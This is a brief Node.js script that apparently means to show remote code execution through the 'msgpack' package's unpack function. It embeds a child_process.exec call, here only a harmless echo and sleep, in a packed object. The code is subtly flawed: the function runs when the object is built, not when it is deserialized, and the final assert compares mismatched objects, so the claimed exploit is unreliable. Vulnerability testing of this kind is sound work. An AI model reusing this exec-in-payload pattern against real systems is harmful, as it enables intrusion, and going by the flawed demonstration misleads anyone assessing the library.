var assert = require('assert');
var msgpack = require('msgpack');
function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}
async function init() {
  var normal = { "a": 1, "b": 2, "c": [1, 2, 3] };
  var malicious = msgpack.pack({
    exploit: function () {
      require('child_process').exec('echo code_executed!;sleep 3', function (error, stdout, stderr) {
        console.log(stdout)
      });
    }(),
  });
  var rce = msgpack.unpack(malicious);
  assert.deepEqual(rce, normal);
}

init();